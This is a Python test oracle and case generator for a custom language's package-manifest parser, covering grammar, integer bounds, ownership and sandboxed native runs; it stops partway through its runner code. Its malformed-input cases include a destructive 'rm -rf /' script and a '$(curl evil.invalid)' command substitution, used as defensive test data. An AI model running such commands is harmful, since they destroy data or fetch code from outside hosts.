#!/usr/bin/env python3
"""Independent grammar/integer oracle and bounded native package.manifest tests.

The frozen grammar and this corpus precede inspection of the implementation.
Native observations are complete little-endian u64 vectors, never exit codes.
GNU as/ld plus a direct Linux write/exit entry are host bootstrap machinery only.
Successful artifacts are losslessly archived and verified; failures stay intact.
"""
from __future__ import annotations
import argparse
from dataclasses import dataclass
import gzip
import hashlib
import io
import json
import os
from pathlib import Path
import random
import re
import resource
import shutil
import subprocess
import sys
import tarfile
import tempfile
import time

sys.dont_write_bytecode = True
ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / 'scripts'))
from compiler_contract import add_identity_arguments, resolve_identity, validate_identity_selection
CONTRACT_SHA256 = '5aa8786a1afc3fac793deccb1e4bb11ae2d6497ab10093b0545c72aa39dc7103'
CAP, MAX_CAP, FLOOR = 256 << 20, 1024 << 20, 1 << 30
SOURCE_CAP, BATCH = 64 << 10, 128
U32, U64 = (1 << 32)-1, (1 << 64)-1
IMIN, IMAX = -(1 << 63), (1 << 63)-1
COUNT_FALLBACK, INDEX_FALLBACK = IMIN+123456789, -81985529216486896
FALLBACKS = (U64, 1 << 63, 0xFEDCBA9876543210)
PREFIX = 'module manifest_oracle;import package.manifest;import package.identity;import std.array;\n'
NAME = rb'[a-z][a-z0-9]*(?:-[a-z0-9]+)*'
DECIMAL = rb'(?:0|[1-9][0-9]{0,9})'
TOKEN = re.compile(rb'('+NAME+rb')@('+DECIMAL+rb')\.('+DECIMAL+rb')\.('+DECIMAL+rb')')
GRAMMAR = re.compile(rb'aurora-package 1\npackage ([^\n]*)\n((?:depends [^\n]*\n){0,8})end\n')


def require(ok, message):
    if not ok:
        raise AssertionError(message)


def cap_self_test():
    for mib in (256, 512, 513, 1023, 1024):
        require(candidate_cap(mib) == mib << 20, 'candidate cap boundary conversion')
    for mib in (-1, 0, 255, 1025, 1 << 30, True, 512.0, '1024', None):
        try:
            candidate_cap(mib)
        except AssertionError:
            continue
        raise AssertionError('invalid candidate cap accepted')


def sha(path):
    return hashlib.sha256(Path(path).read_bytes()).hexdigest()


def artifact_path(value):
    raw = Path(value).absolute()
    require('..' not in raw.parts, 'artifact path traversal denied')
    require(not any(p.is_symlink() for p in [raw, *raw.parents]), 'symlink output root denied')
    canonical = raw.resolve(strict=False)
    require(canonical.is_relative_to(ROOT), 'artifacts must stay within the candidate')
    return canonical


def candidate_cap(mib):
    require(type(mib) is int and 256 <= mib <= 1024,
            'candidate cap must be an integer between 256 and 1024 MiB; increases require explicit aggregate admission')
    return mib << 20


def signed(value):
    return '(-9223372036854775807-1)' if value == IMIN else str(value)


@dataclass(frozen=True)
class Identity:
    status: str = 'malformed'
    name: bytes = b''
    version: tuple = (0, 0, 0)

    def values(self):
        good = self.status == 'success'
        return (('success', 'malformed', 'out_of_range').index(self.status)+1,
                len(self.name) if good else 0, *(self.version if good else FALLBACKS),
                *(self.name if good else b'').ljust(24, b'\0'))


def identity_oracle(token):
    match = TOKEN.fullmatch(token)
    if match is None or len(match[1]) > 24:
        return Identity()
    version = tuple(int(x) for x in match.groups()[1:])
    return Identity('success', match[1], version) if max(version) <= U32 else Identity()


@dataclass(frozen=True)
class Manifest:
    status: str
    root: Identity = Identity()
    dependencies: tuple = ()

    def values(self):
        good = self.status == 'success'
        return (('success', 'malformed', 'out_of_range').index(self.status)+1,
                len(self.dependencies) if good else COUNT_FALLBACK & U64,
                *(self.root if good else Identity()).values())

    def query(self, index):
        status = self.status
        if status == 'success' and not 0 <= index < len(self.dependencies):
            status = 'index_out_of_range'
        good = status == 'success'
        return (('success', 'malformed', 'out_of_range', 'index_out_of_range').index(status)+1,
                len(self.dependencies) if good else COUNT_FALLBACK & U64,
                index if good else INDEX_FALLBACK & U64,
                *(self.root if good else Identity()).values(),
                *(self.dependencies[index] if good else Identity()).values())


def parse_oracle(data, offset, count):
    # Arbitrary precision addition and regex fullmatch intentionally differ from
    # the production scanner and subtraction-first machine arithmetic.
    if offset < 0 or count < 0 or offset+count > len(data):
        return Manifest('out_of_range')
    selected = data[offset:offset+count]
    match = GRAMMAR.fullmatch(selected)
    if match is None:
        return Manifest('malformed')
    root = identity_oracle(match[1])
    deps = tuple(identity_oracle(line[8:]) for line in match[2].split(b'\n')[:-1])
    identities = (root, *deps)
    if any(x.status != 'success' for x in identities) or len({x.name for x in identities}) != len(identities):
        return Manifest('malformed')
    return Manifest('success', root, deps)


def manifest_constructor(status, root, count):
    if status == 'success' and (root.status != 'success' or not 0 <= count <= 8):
        status = 'malformed'
    good = status == 'success'
    return (('success', 'malformed', 'out_of_range').index(status)+1,
            count if good else COUNT_FALLBACK & U64,
            *(root if good else Identity()).values())


def dependency_constructor(status, root, dep, count, index):
    if status == 'success' and (root.status != 'success' or dep.status != 'success'
            or root.name == dep.name or not 1 <= count <= 8 or not 0 <= index < count):
        status = 'malformed'
    good = status == 'success'
    return (('success', 'malformed', 'out_of_range', 'index_out_of_range').index(status)+1,
            count if good else COUNT_FALLBACK & U64, index if good else INDEX_FALLBACK & U64,
            *(root if good else Identity()).values(), *(dep if good else Identity()).values())


@dataclass(frozen=True)
class Case:
    label: str
    body: str
    expected: tuple
    helpers: str = ''
    arguments: tuple = (0, 0)


def array(name, data):
    require(1 <= len(data) <= 4096, 'supported input owner length')
    return f'array<u8,{len(data)}> {name}={{'+','.join(f'{x}u8' for x in data)+'};'


def manifest(root=b'a@0.0.0', deps=()):
    return b'aurora-package 1\npackage '+root+b'\n'+b''.join(b'depends '+x+b'\n' for x in deps)+b'end\n'


def parse_case(label, data, offset=0, count=None, index=0, mutation=None):
    count = len(data) if count is None else count
    owner = data or b'\0'
    arguments = (0, 0)
    body = array('owner', owner)
    if mutation is not None:
        position, value = mutation
        model_data = owner[:position]+bytes([value])+owner[position+1:]
        body += 'owner[argument1]=u8(argument2);'
        arguments = mutation
    else:
        model_data = owner
    model = parse_oracle(model_data, offset, count)
    # Two independent calls each validate a complete original owner. Its overwrite
    # occurs only after copied result construction and borrow end.
    body += ('if(slot<31){const package::ManifestResult parsed=package::parse_manifest('
             f'borrow_bytes(owner),{signed(offset)},{signed(count)});'
             'const package::ManifestResult r=parsed;'
             f'i64 i=0;while(i<{len(owner)}){{owner[i]=255u8;i=i+1;}}'
             'return observe_manifest(r,slot);}'
             'const package::DependencyResult parsed=package::manifest_dependency('
             f'borrow_bytes(owner),{signed(offset)},{signed(count)},{signed(index)});'
             'const package::DependencyResult r=parsed;'
             f'i64 i=0;while(i<{len(owner)}){{owner[i]=0u8;i=i+1;}}'
             'return observe_dependency(r,slot-31);')
    return Case(label, body, model.values()+model.query(index), arguments=arguments)


def shared():
    source = '''auto bits(i64 value)->u64{if(value<0){return 9223372036854775808u64+u64(value-(-9223372036854775807-1));}return u64(value);}
auto observe_identity(package::IdentityResult r,i64 slot)->u64{
if(slot==0){if(r.status()==package::IdentityStatus::success){return 1u64;}if(r.status()==package::IdentityStatus::malformed){return 2u64;}return 3u64;}
if(slot==1){return u64(r.name_size());}
'''
    for slot, (method, fallback) in enumerate(zip(('major_or', 'minor_or', 'patch_or'), FALLBACKS), 2):
        source += f'if(slot=={slot}){{return r.{method}({fallback}u64);}}'
    source += '''const std::array<u8,24> storage=r.name_bytes_or_zero();return u64(storage.at(slot-5));}
auto observe_manifest(package::ManifestResult r,i64 slot)->u64{
if(slot==0){if(r.status()==package::ManifestStatus::success){return 1u64;}if(r.status()==package::ManifestStatus::malformed){return 2u64;}return 3u64;}
'''
    source += f'if(slot==1){{return bits(r.dependency_count_or({signed(COUNT_FALLBACK)}));}}'
    source += '''const package::IdentityResult root=r.identity_or_error();return observe_identity(root,slot-2);}
auto observe_dependency(package::DependencyResult r,i64 slot)->u64{
if(slot==0){if(r.status()==package::DependencyStatus::success){return 1u64;}if(r.status()==package::DependencyStatus::malformed){return 2u64;}if(r.status()==package::DependencyStatus::out_of_range){return 3u64;}return 4u64;}
'''
    source += f'if(slot==1){{return bits(r.dependency_count_or({signed(COUNT_FALLBACK)}));}}'
    source += f'if(slot==2){{return bits(r.index_or({signed(INDEX_FALLBACK)}));}}'
    source += '''if(slot<32){const package::IdentityResult root=r.identity_or_error();return observe_identity(root,slot-3);}
const package::IdentityResult dep=r.dependency_or_error();return observe_identity(dep,slot-32);}
'''
    return source


def parsing_cases():
    cases = []
    def add(label, data, offset=0, count=None, index=0, mutation=None):
        cases.append(parse_case(label, data, offset, count, index, mutation))
    maximum = b'z'*24+b'@4294967295.4294967295.4294967295'
    deps = tuple(bytes([97+i])+b'q'*23+b'@4294967295.4294967295.4294967295' for i in range(8))
    for root, ds in ((b'a@0.0.0', ()), (maximum, deps),
                     (b'app@2147483648.0.17', (b'lib-a@0.0.0', b'lib-b@0.0.0'))):
        for index in (IMIN, -1, *range(10), IMAX):
            add(f'canonical/{len(ds)}/{index}', manifest(root, ds), index=index)
    for count in range(11):
        ds = tuple(bytes([98+i])+b'@1.2.3' for i in range(count))
        for index in (-1, 0, count-1, count):
            add(f'dependency-limit/{count}/{index}', manifest(deps=ds), index=index)
    for token in (manifest(), manifest(b'a1-b2@12.34.56',(b'c3-d4@56.78.90',)), manifest(maximum,deps)):
        for cut in range(len(token)):
            add(f'truncation/{len(token)}/{cut}', token, count=cut)
        # Every distinct starting boundary must not accidentally accept a suffix.
        for cut in range(1, len(token)+1):
            add(f'suffix/{len(token)}/{cut}', token, offset=cut, count=len(token)-cut)
    representative = manifest(b'a1-b2@12.34.56',(b'c3-d4@56.78.90',))
    for position in range(len(representative)):
        for value in range(256):
            add(f'all-byte-substitution/{position}/{value}', representative, mutation=(position,value))
    for data in (b'', b'\0', b'aurora-package 1\n', b'end\n', b'package a@1.2.3\nend\n',
                 b'aurora-package 1\nend\n', b'aurora-package 1\npackage a@1.2.3\n',
                 b'aurora-package 1\npackage a@1.2.3\ndepends b@1.2.3\n',
                 b'#!/bin/sh\nrm -rf /\n', b'$(curl evil.invalid)\n'):
        add('missing-or-script/'+data.hex(),data,index=IMIN)
    seed = manifest(b'app@1.2.3',(b'lib@3.2.1',))
    add('dependency-only-crlf',seed.replace(b'depends lib@3.2.1\n',b'depends lib@3.2.1\r\n'))
    for bad in (b'\0', b'\r', b'\r\n', b' ', b'\t', b'\n', b'\xef\xbb\xbf', b'# comment\n', b'end\n', b'execute sh\n'):
        add('leading/'+bad.hex(), bad+seed)
        add('trailing/'+bad.hex(), seed+bad)
        add('inside/'+bad.hex(), seed[:16]+bad+seed[16:])
    for data in (seed.replace(b'\n',b'\r\n'), seed.replace(b'package ',b'package  '),
                 seed.replace(b'depends ',b'depends\t'),seed.replace(b'aurora-package 1',b'aurora-package 01'),
                 seed.replace(b'aurora-package 1',b'aurora-package 2'), seed.upper(),
                 seed.replace(b'depends lib@3.2.1\n',b'unknown lib@3.2.1\n'),
                 seed.replace(b'depends lib@3.2.1\n',b'script echo okay\n'),
                 seed.replace(b'end\n',b'package b@1.2.3\nend\n')):
        add('grammar/'+data.hex(), data)
    bad_tokens = [b'', b'-@1.2.3', b'A@1.2.3', b'1a@1.2.3', b'a-@1.2.3', b'a--b@1.2.3',
                  b'-a@1.2.3', b'a_b@1.2.3', b'a/b@1.2.3', b'a\0b@1.2.3', 'caf\u00e9@1.2.3'.encode(),
                  b'a'*25+b'@1.2.3', b'a@1.2.3.4', b'a@1.2.3-pre', b'a@1.2.3+build']
    for number in (b'', b'00', b'01', b'+1', b'-1', b'1e2', b'0x1', b'1_0', b'4294967296', b'9999999999', b'18446744073709551615'):
        for component in range(3):
            parts = [b'1',b'2',b'3'];parts[component]=number
            bad_tokens.append(b'a@'+b'.'.join(parts))
    for bad in bad_tokens:
        add('bad-root/'+bad.hex(),manifest(bad,(b'good@1.2.3',)))
        for index in (-1,0,1,2,IMAX):
            add(f'bad-late-dependency/{bad.hex()}/{index}',manifest(b'root@1.2.3',(b'good@1.2.3',bad)),index=index)
    add('self-name-different-version',manifest(b'app@1.2.3',(b'app@9.8.7',)))
    for position in range(8):
        for kind in ('self','same-version','different-version'):
            ds = list(deps)
            ds[position] = maximum if kind=='self' else (ds[0] if kind=='same-version' else ds[0].split(b'@')[0]+b'@0.0.0')
            if position == 0 and kind != 'self':
                ds[-1]=ds[0].split(b'@')[0]+(b'@0.0.0' if kind=='different-version' else b'@4294967295.4294967295.4294967295')
            for index in (-1,0,7,8):
                add(f'global-name-rule/{kind}/{position}/{index}',manifest(maximum,tuple(ds)),index=index)
    for number in (0,1,9,10,99,2147483647,2147483648,U32-1,U32,U32+1,U64):
        for component in range(3):
            parts=[b'1',b'2',b'3'];parts[component]=str(number).encode()
            token=b'version@'+b'.'.join(parts)
            add(f'numeric-boundary/{component}/{number}',manifest(token,(b'other@1.2.3',)))
            add(f'numeric-dependency/{component}/{number}',manifest(b'root@1.2.3',(token,)))
    for length in range(27):
        add(f'name-length/{length}',manifest(b'a'*length+b'@0.0.0'))
    owner=b'\xff\0'+seed+b'\xff\0'
    for offset in (IMIN,-1,0,1,2,3,len(owner)-1,len(owner),len(owner)+1,IMAX):
        for count in (IMIN,-1,0,1,37,len(seed),len(owner),len(owner)+1,IMAX):
            for index in (-1,0,IMAX):
                add(f'window/{offset}/{count}/{index}',owner,offset,count,index)
    add('window/exact-delimited',owner,2,len(seed))
    for length in (616,1024,4096):
        add(f'large-owner/{length}',b'\xff'*(length-len(seed))+seed,length-len(seed),len(seed))
        add(f'large-invalid/{length}',b'a'*length)
    rng=random.Random(221004)
    for i in range(80):
        ds=[]
        for n in range(rng.randrange(9)):
            name=bytes([98+n])+bytes(rng.choice(b'abcdefghijklmnopqrstuvwxyz0123456789') for _ in range(rng.randrange(24)))
            ds.append(name+b'@'+b'.'.join(str(rng.randrange(1<<32)).encode() for _ in range(3)))
        data=manifest(b'app@1.2.3',tuple(ds))
        index=rng.randrange(-1,len(ds)+1)
        add(f'seed221004-valid/{i}',data,index=index)
        add(f'seed221004-mutation/{i}',data,index=index,mutation=(rng.randrange(len(data)),rng.randrange(256)))
    return cases


def identity_source(name, token, status='success', poison=False):
    identity=identity_oracle(token)
    source='std::array<u8,24> '+name+'_storage=std::array<u8,24>();'
    for i,v in enumerate(identity.name):
        source+=f'{name}_storage.set({i},{v}u8);'
    length=len(identity.name)
    version=identity.version
    if poison:
        length=IMAX;version=(U64,U64,U64)
        source+=f'{name}_storage.set(23,255u8);'
    source+=f'const package::IdentityResult {name}=package::IdentityResult(package::IdentityStatus::{status},{name}_storage,{signed(length)},'+','.join(f'{x}u64' for x in version)+');'
    result=identity if status=='success' and not poison else Identity(status if status!='success' else 'malformed')
    return source,result


def construction_cases():
    cases=[]
    roots=((b'root@1.2.3','success',False),(b'root@1.2.3','success',True),(b'root@1.2.3','malformed',False),(b'root@1.2.3','out_of_range',True))
    for status in ('success','malformed','out_of_range'):
        for rno,(rt,rs,rp) in enumerate(roots):
            for count in (IMIN,-1,0,1,8,9,IMAX):
                src,r=identity_source('root',rt,rs,rp)
                src+=f'const package::ManifestResult original=package::ManifestResult(package::ManifestStatus::{status},root,{signed(count)});'
                src+='const package::ManifestResult r=original;root_storage.set(0,255u8);return observe_manifest(r,slot);'
                cases.append(Case(f'constructor-manifest/{status}/{rno}/{count}',src,manifest_constructor(status,r,count)))
    for status in ('success','malformed','out_of_range','index_out_of_range'):
        for count in (IMIN,-1,0,1,8,9,IMAX):
            for index in (IMIN,-1,0,1,7,8,IMAX):
                src,r=identity_source('root',b'root@4294967295.2147483648.17')
                other,d=identity_source('dep',b'dep@0.1.2');src+=other
                src+=f'const package::DependencyResult original=package::DependencyResult(package::DependencyStatus::{status},root,dep,{signed(count)},{signed(index)});'
                src+='const package::DependencyResult r=original;root_storage.set(0,255u8);dep_storage.set(0,255u8);return observe_dependency(r,slot);'
                cases.append(Case(f'constructor-dependency/{status}/{count}/{index}',src,dependency_constructor(status,r,d,count,index)))
    for status in ('success','malformed','out_of_range','index_out_of_range'):
        for root_bad in (False,True):
            for dep_status in ('success','malformed','out_of_range'):
                for dep_poison in (False,True):
                    for same in (False,True):
                        src,r=identity_source('root',b'root@1.2.3','success',root_bad)
                        other,d=identity_source('dep',b'root@9.8.7' if same else b'dep@9.8.7',dep_status,dep_poison);src+=other
                        src+=f'const package::DependencyResult r=package::DependencyResult(package::DependencyStatus::{status},root,dep,8,7);return observe_dependency(r,slot);'
                        cases.append(Case(f'constructor-local-invariants/{status}/{root_bad}/{dep_status}/{dep_poison}/{same}',src,dependency_constructor(status,r,d,8,7)))
    return cases


def ownership_cases():
    data=manifest(b'owned-root@4294967295.2147483648.17',(b'owned-dep@17.2147483648.4294967295',))
    model=parse_oracle(data,0,len(data))
    helper=('auto make_manifest()->package::ManifestResult{{'+array('local',data)+f'const package::ManifestResult r=package::parse_manifest(borrow_bytes(local),0,{len(data)});return r;}}}}'
            'auto make_dependency()->package::DependencyResult{{'+array('local',data)+f'const package::DependencyResult r=package::manifest_dependency(borrow_bytes(local),0,{len(data)},0);return r;}}}}'
            'auto copy_manifest(package::ManifestResult r)->package::ManifestResult{return r;}'
            'auto copy_dependency(package::DependencyResult r)->package::DependencyResult{return r;}')
    body=('if(slot<31){const package::ManifestResult a=make_manifest();const package::ManifestResult r=copy_manifest(a);return observe_manifest(r,slot);}'
          'const package::DependencyResult a=make_dependency();const package::DependencyResult r=copy_dependency(a);return observe_dependency(r,slot-31);')
    cases=[Case('ownership/function-and-nested-owner-scope-exit',body,model.values()+model.query(0),helper)]
    helper='class Counter{i64 calls;public:Counter():calls(0){}auto next()->i64{calls=calls+1;return -81985529216486896;}auto count()const->i64{return calls;}};'
    for good in (True,False):
        selected=data if good else data[:-1]
        body=array('owner',selected)+f'const package::ManifestResult m=package::parse_manifest(borrow_bytes(owner),0,{len(selected)});const package::DependencyResult d=package::manifest_dependency(borrow_bytes(owner),0,{len(selected)},0);'
        body+='Counter c=Counter();const i64 a=m.dependency_count_or(c.next());const i64 b=d.dependency_count_or(c.next());const i64 i=d.index_or(c.next());if(slot==0){return bits(c.count());}if(slot==1){return bits(a);}if(slot==2){return bits(b);}return bits(i);'
        cases.append(Case(f'eager-fallback/{good}',body,(3,1,1,0) if good else (3,INDEX_FALLBACK&U64,INDEX_FALLBACK&U64,INDEX_FALLBACK&U64),helper))
    # Separate calls observe their own changed input; retained reports stay copied.
    body=array('owner',data)+f'const package::DependencyResult before=package::manifest_dependency(borrow_bytes(owner),0,{len(data)},0);owner[0]=0u8;const package::DependencyResult after=package::manifest_dependency(borrow_bytes(owner),0,{len(data)},0);'
    body+='if(slot<61){return observe_dependency(before,slot);}return observe_dependency(after,slot-61);'
    cases.append(Case('ownership/separate-call-observations',body,model.query(0)+Manifest('malformed').query(0)))
    body=array('owner',data)+f'const package::DependencyResult r=package::manifest_dependency(borrow_bytes(owner),0,{len(data)},0);'
    body+='const package::IdentityResult root=r.identity_or_error();const package::IdentityResult dep=r.dependency_or_error();std::array<u8,24> rn=root.name_bytes_or_zero();std::array<u8,24> dn=dep.name_bytes_or_zero();i64 i=0;while(i<24){rn.set(i,255u8);dn.set(i,255u8);i=i+1;}return observe_dependency(r,slot);'
    cases.append(Case('ownership/getter-name-copies-isolated',body,model.query(0)))
    return cases


def negative_cases():
    data=manifest(b'root@1.2.3',(b'dep@3.2.1',))
    initial=array('bytes',data)
    m=f'const package::ManifestResult m=package::parse_manifest(borrow_bytes(bytes),0,{len(data)});'
    d=f'const package::DependencyResult d=package::manifest_dependency(borrow_bytes(bytes),0,{len(data)},0);'
    def wrap(body,prefix=PREFIX):
        return prefix+'auto answer()->u64{'+initial+body+'return 0u64;}'
    cases=[
        ('live-span-owner-mutation',wrap(f'const builtin::span<const u8> v=borrow_bytes(bytes);const package::ManifestResult m=package::parse_manifest(v,0,{len(data)});bytes[0]=0u8;'),'cannot mutate a byte array while a span is live'),
        ('live-reborrow-owner-mutation',wrap(f'const builtin::span<const u8> v=borrow_bytes(bytes);{{const builtin::span<const u8> c=v;const package::DependencyResult d=package::manifest_dependency(c,0,{len(data)},0);}}bytes[0]=0u8;'),'cannot mutate a byte array while a span is live'),
        ('span-cannot-return',PREFIX+'auto leak()->builtin::span<const u8>{'+initial+'return borrow_bytes(bytes);}',"only scalar function results or scalar-field class values are supported (found '{')"),
        ('span-cannot-be-field',PREFIX+'class Leak{builtin::span<const u8> value;};',"class fields require scalar, class or private fixed-array storage (found ';')"),
        ('manifest-enum-no-conversion',wrap('const u64 x=u64(package::ManifestStatus::success);'),'expected distinct i64, u64 or u8 conversion types'),
        ('dependency-enum-no-conversion',wrap('const u64 x=u64(package::DependencyStatus::success);'),'expected distinct i64, u64 or u8 conversion types'),
        ('manifest-no-designated-construction',wrap('const package::ManifestResult m=package::ManifestResult{};'),'constructor-bearing class rejects designated initialization'),
        ('dependency-no-designated-construction',wrap('const package::DependencyResult d=package::DependencyResult{};'),'constructor-bearing class rejects designated initialization'),
        ('manifest-no-span-forgery',wrap(m+'const builtin::span<const u8> v=borrow_bytes(m);'),'borrow_bytes requires a named local byte array'),
        ('dependency-no-span-forgery',wrap(d+'const builtin::span<const u8> v=borrow_bytes(d);'),'borrow_bytes requires a named local byte array'),
        ('manifest-unsigned-offset',wrap(f'const package::ManifestResult m=package::parse_manifest(borrow_bytes(bytes),0u64,{len(data)});'),'expected i64, got u64'),
        ('manifest-unsigned-count',wrap(f'const package::ManifestResult m=package::parse_manifest(borrow_bytes(bytes),0,{len(data)}u64);'),'expected i64, got u64'),
        ('dependency-unsigned-index',wrap(f'const package::DependencyResult d=package::manifest_dependency(borrow_bytes(bytes),0,{len(data)},0u64);'),'expected i64, got u64'),
        ('manifest-unsigned-fallback',wrap(m+'const i64 n=m.dependency_count_or(0u64);'),'expected i64, got u64'),
        ('dependency-unsigned-fallback',wrap(d+'const i64 n=d.index_or(0u64);'),'expected i64, got u64'),
        ('returned-storage-const',wrap(d+'const package::IdentityResult id=d.dependency_or_error();const std::array<u8,24> n=id.name_bytes_or_zero();n.set(0,0u8);'),'mutable method requires a mutable receiver'),
        ('identity-import-required',wrap(m+'const package::IdentityResult id=m.identity_or_error();', 'module manifest_oracle;import package.manifest;import std.array;\n'),'class type requires a direct visible import: package::ManifestResult'),
        ('array-import-required',wrap(m+'const package::IdentityResult id=m.identity_or_error();const std::array<u8,24> n=id.name_bytes_or_zero();','module manifest_oracle;import package.manifest;import package.identity;\n'),'unsupported type or unknown class template; expected a declared template: std::array'),
    ]
    for name in ('outcome','stored_identity','dependencies'):
        expression=('if(m.outcome==package::ManifestStatus::success){return 1u64;}' if name=='outcome' else
                    'const package::IdentityResult x=m.stored_identity;' if name=='stored_identity' else 'const i64 x=m.dependencies;')
        cases.append(('manifest-private-'+name,wrap(m+expression),'private class field is inaccessible'))
    for name in ('outcome','stored_identity','stored_dependency','dependencies','selected_index'):
        expression=('if(d.outcome==package::DependencyStatus::success){return 1u64;}' if name=='outcome' else
                    'const package::IdentityResult x=d.'+name+';' if name.startswith('stored_') else 'const i64 x=d.'+name+';')
        cases.append(('dependency-private-'+name,wrap(d+expression),'private class field is inaccessible'))
    cases.append(('private-manifest-helper',wrap('const package::IdentityResult x=package::manifest_identity_error();'),'private function is not imported: package::manifest_identity_error'))
    cases.append(('private-name-helper',wrap(m+'const package::IdentityResult x=m.identity_or_error();if(package::manifest_name_equal(x,x)){return 1u64;}'),'private function is not imported: package::manifest_name_equal'))
    cases.append(('private-method-wrapper',PREFIX+'class Sealed{package::ManifestResult report;auto hidden()const->i64{return report.dependency_count_or(-1);}public:Sealed(package::ManifestResult value):report(value){}};auto answer()->u64{'+initial+m+'const Sealed s=Sealed(m);return u64(s.hidden());}','private method is inaccessible'))
    return cases


def binding_cases():
    helper='namespace package{auto manifest_name_equal(IdentityResult a,IdentityResult b)->bool{return false;}auto manifest_literal(builtin::span<const u8> bytes,i64 offset,builtin::span<const u8> literal)->bool{return true;}auto manifest_line_end(builtin::span<const u8> bytes,i64 start,i64 end)->i64{return -1;}}'
    cases=[]
    for label,data in (('valid',manifest(b'root@1.2.3',(b'dep@3.2.1',))),('duplicate',manifest(b'root@1.2.3',(b'dep@3.2.1',b'dep@9.8.7'))),('bad-header',b'X'+manifest()[1:])):
        base=parse_case('defining-module-binding/'+label,data)
        cases.append(Case(base.label,base.body,base.expected,helper))
    return cases


def validate(output, expected, returncode=0):
    require(returncode==0,f'native exit {returncode}')
    require(len(output)==8*len(expected),f'exact output length expected {8*len(expected)}, got {len(output)}')
    observed=tuple(int.from_bytes(output[i:i+8],'little') for i in range(0,len(output),8))
    for i,(actual,wanted) in enumerate(zip(observed,expected)):
        require(actual==wanted,f'observation {i}: expected {wanted}, got {actual}')
    return observed


def self_test():
    minimal=manifest()
    require(len(minimal)==37,'minimum length')
    maximum=manifest(b'z'*24+b'@4294967295.4294967295.4294967295',tuple(bytes([97+i])+b'q'*23+b'@4294967295.4294967295.4294967295' for i in range(8)))
    require(len(maximum)==615 and parse_oracle(maximum,0,615).status=='success','maximum length')
    require(parse_oracle(minimal,0,len(minimal)).status=='success','minimum grammar')
    require(len(parse_oracle(minimal,0,37).values())==31 and len(parse_oracle(maximum,0,615).query(7))==61,'complete vector sizes')
    for invalid in (minimal[:-1],minimal+b'\n',manifest(b'a@01.0.0'),manifest(deps=(b'a@1.2.3',)),manifest(deps=(b'b@0.0.0',b'b@1.2.3')),manifest(deps=(b'b@1.2.3\r',))):
        require(parse_oracle(invalid,0,len(invalid)).status=='malformed','grammar invalid')
        require(parse_oracle(invalid,0,len(invalid)).query(IMIN)[0]==2,'grammar before index')
    require(parse_oracle(minimal,IMAX,IMAX).query(IMIN)[0]==3,'window precedence')
    require(parse_oracle(minimal,0,37).query(0)[0]==4,'empty dependency selection')
    validate(U64.to_bytes(8,'little'),(U64,))
    for output,expected,code in ((b'\xff'+bytes(7),(U64,),0),(bytes(7),(0,),0),(bytes(9),(0,),0),(bytes(8),(0,),-4),(bytes(8),(0,),1)):
        try:validate(output,expected,code)
        except AssertionError:pass
        else:raise AssertionError('observer accepted broken high-bit/length/exit control')
    require(artifact_path(ROOT/'build'/'future-artifact')==ROOT/'build'/'future-artifact','contained path')
    for path in (ROOT/'build'/'..'/'..'/'escaped',ROOT/'..'/'escaped',ROOT.parent/'escaped'):
        try:artifact_path(path)
        except AssertionError:pass
        else:raise AssertionError('containment accepted traversal/outside path')
    with tempfile.TemporaryDirectory(prefix='manifest-path-control-',dir=ROOT/'build') as temporary:
        link=Path(temporary)/'escape';link.symlink_to(ROOT.parent,target_is_directory=True)
        try:artifact_path(link/'output')
        except AssertionError:pass
        else:raise AssertionError('containment accepted symlink ancestor')
    require(candidate_cap(256)==CAP and candidate_cap(1024)==MAX_CAP,'cap boundaries')
    cap_self_test()


def all_cases():
    parse=parsing_cases();construction=construction_cases();ownership=ownership_cases();binding=binding_cases()
    return parse+construction+ownership+binding,dict(parse_cases=len(parse),constructor_cases=len(construction),ownership_cases=len(ownership),binding_cases=len(binding))


def freeze_corpus(directory):
    require(not directory.exists(),'fresh oracle freeze directory required')
    directory.mkdir()
    cases,counts=all_cases()
    with gzip.open(directory/'corpus.jsonl.gz','wt',encoding='utf-8') as out:
        for case in cases:
            out.write(json.dumps(case.__dict__,sort_keys=True)+'\n')
    shutil.copyfile(__file__,directory/'package_manifest.py')
    report=dict(status='revised-reference-after-independent-v1-freeze',contract_sha256=CONTRACT_SHA256,
                original_freeze='oracle-reference-v1/freeze.json',
                revision_reason='Exact LF model repair retained; safe failed-run finalization and verified tar.xz compaction; expanded explicit-error constructor poisoning, copied getter isolation, different-version self-name and symlink-path controls.',
                oracle_sha256=sha(__file__),corpus_sha256=sha(directory/'corpus.jsonl.gz'),
                cases=len(cases),observations=sum(len(x.expected) for x in cases),counts=counts,
                utc=time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime()))
    (directory/'freeze.json').write_text(json.dumps(report,indent=2)+'\n')
    print(json.dumps(report,indent=2))


class Runner:
    def __init__(self,compiler,artifacts,cap=CAP):
        self.compiler,self.artifacts,self.cap=compiler,artifacts,cap
        self.peak,self.process_count=0,0
        self.tools={}
        for name in ('as','ld','nm','readelf'):
            found=shutil.which(name)
            require(found is not None,'required tool missing: '+name)
            self.tools[name]=Path(found).resolve(strict=True)
        self.pins={}

    def measure(self):
        allocated=ROOT.lstat().st_blocks*512+sum(p.lstat().st_blocks*512 for p in ROOT.rglob('*'))
        self.peak=max(self.peak,allocated)
        return allocated,shutil.disk_usage(ROOT).free

    def budget(self,reserve=0):
        allocated,free=self.measure()
        require(allocated+reserve<=self.cap,f'whole-candidate {self.cap} byte cap: {allocated} + reserve {reserve}')
        require(free-reserve>=FLOOR,'1 GiB free floor including reserve')
        return allocated

    def verify_pins(self):
        for path,wanted in self.pins.items():
            require(sha(path)==wanted,'input/tool changed during execution: '+str(path))

    def command(self,args,directory,name,*,compiler=False,allow_rejection=False):
        args=list(args)
        if str(args[0]) in self.tools:
            args[0]=self.tools[str(args[0])]
        self.verify_pins()
        self.budget(24<<20)
        self.process_count+=1
        def limits():
            resource.setrlimit(resource.RLIMIT_CORE,(0,0))
            resource.setrlimit(resource.RLIMIT_CPU,(10,11))
            resource.setrlimit(resource.RLIMIT_FSIZE,(8<<20,8<<20))
            resource.setrlimit(resource.RLIMIT_AS,((512 if compiler else 128)<<20,)*2)
        record=dict(command=list(map(str,args)),wall_seconds=30,cpu_soft_hard_seconds=[10,11],
                    address_space_bytes=(512 if compiler else 128)<<20,regular_file_cap=8<<20,
                    total_growth_reserve=24<<20,executable_sha256=sha(args[0]))
        try:
            with (directory/(name+'.stdout')).open('wb') as out,(directory/(name+'.stderr')).open('wb') as err:
                result=subprocess.run(list(map(str,args)),stdout=out,stderr=err,timeout=30,preexec_fn=limits)
            record['returncode']=result.returncode
